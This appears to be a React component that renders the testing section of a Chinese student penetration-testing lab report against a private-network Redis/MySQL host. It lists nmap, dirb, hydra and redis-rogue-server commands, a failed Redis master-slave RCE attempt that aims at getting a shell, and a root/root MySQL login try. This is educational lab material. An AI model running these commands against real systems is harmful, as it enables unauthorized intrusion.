import React from 'react';
import { KaliTerminal } from '../shared/Terminal';

// 七、测试分析
export const NS07_Testing: React.FC = () => {
    return (
        <div id="ns-testing" className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
            <h2 className="text-[18pt] font-hei mb-6 font-bold">七、测试分析</h2>

            <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">7.1 测试数据</h3>
            <div className="mb-4">
                <table className="w-full border-collapse border border-gray-400">
                    <thead>
                        <tr className="bg-gray-100">
                            <th className="border border-gray-400 p-2 text-left">测试项目</th>
                            <th className="border border-gray-400 p-2 text-left">测试命令</th>
                            <th className="border border-gray-400 p-2 text-left">预期结果</th>
                            <th className="border border-gray-400 p-2 text-left">实际结果</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td className="border border-gray-400 p-2">主机发现</td>
                            <td className="border border-gray-400 p-2 font-mono text-xs">nmap -sn</td>
                            <td className="border border-gray-400 p-2">发现存活主机</td>
                            <td className="border border-gray-400 p-2 text-green-600">✓ 通过</td>
                        </tr>
                        <tr>
                            <td className="border border-gray-400 p-2">端口扫描</td>
                            <td className="border border-gray-400 p-2 font-mono text-xs">nmap -sV</td>
                            <td className="border border-gray-400 p-2">识别开放端口</td>
                            <td className="border border-gray-400 p-2 text-green-600">✓ 通过</td>
                        </tr>
                        <tr>
                            <td className="border border-gray-400 p-2">目录扫描</td>
                            <td className="border border-gray-400 p-2 font-mono text-xs">dirb</td>
                            <td className="border border-gray-400 p-2">发现敏感文件</td>
                            <td className="border border-gray-400 p-2 text-green-600">✓ 通过</td>
                        </tr>
                        <tr>
                            <td className="border border-gray-400 p-2">Redis检测</td>
                            <td className="border border-gray-400 p-2 font-mono text-xs">redis-cli ping</td>
                            <td className="border border-gray-400 p-2">检测未授权访问</td>
                            <td className="border border-gray-400 p-2 text-green-600">✓ 通过</td>
                        </tr>
                        <tr>
                            <td className="border border-gray-400 p-2">RCE利用</td>
                            <td className="border border-gray-400 p-2 font-mono text-xs">redis-rogue</td>
                            <td className="border border-gray-400 p-2">获取Shell</td>
                            <td className="border border-gray-400 p-2 text-red-600">✗ 失败</td>
                        </tr>
                        <tr>
                            <td className="border border-gray-400 p-2">SSH爆破</td>
                            <td className="border border-gray-400 p-2 font-mono text-xs">hydra</td>
                            <td className="border border-gray-400 p-2">发现弱口令</td>
                            <td className="border border-gray-400 p-2 text-yellow-600">未发现</td>
                        </tr>
                    </tbody>
                </table>
            </div>
            <p className="text-center text-sm font-bold mb-4">表 7-1 测试数据汇总表</p>

            <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">7.2 调试时遇到的错误</h3>

            <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">问题1：Redis主从复制RCE利用失败</h4>
            <p className="mb-2 indent-8 text-justify">
                <strong>错误描述：</strong>使用redis-rogue-server工具尝试加载恶意模块时失败。
            </p>
            <KaliTerminal 
                cwd="/tmp/redis-rogue-server"
                command="python3 redis-rogue-server.py --rhost 192.168.6.208 --lhost 192.168.6.210"
                output={`[info] TARGET 192.168.6.208:6379
[info] Setting master...
[info] Setting dbfilename...
[ERR] CONFIG SET failed (possibly related to argument 'dir') - can't set protected config`}
            />
            <p className="mb-2 indent-8 text-justify">
                <strong>原因分析：</strong>Redis 7.0版本增加了保护机制，禁止通过CONFIG SET修改dir和dbfilename参数。
            </p>
            <p className="mb-4 indent-8 text-justify">
                <strong>解决方法：</strong>该漏洞在新版本Redis中已被修复，说明及时更新软件版本是有效的安全防护措施。
                在实际渗透测试中，应寻找其他攻击向量或利用其他漏洞。
            </p>

            <h4 className="text-[12pt] font-hei font-bold mt-4 mb-2">问题2：MySQL远程连接被拒绝</h4>
            <p className="mb-2 indent-8 text-justify">
                <strong>错误描述：</strong>尝试远程连接MySQL数据库时被拒绝。
            </p>
            <KaliTerminal 
                command="mysql -h 192.168.6.208 -u root --password=root"
                output={`ERROR 1130 (HY000): Host '192.168.6.210' is not allowed to connect to this MariaDB server`}
            />
            <p className="mb-2 indent-8 text-justify">
                <strong>原因分析：</strong>MySQL配置了访问控制，只允许本地连接或特定IP访问。
            </p>
            <p className="mb-4 indent-8 text-justify">
                <strong>解决方法：</strong>这是正确的安全配置，数据库不应该暴露在外网。在渗透测试中，
                需要先获取Web服务器权限，再从内部访问数据库。
            </p>
        </div>
    );
};
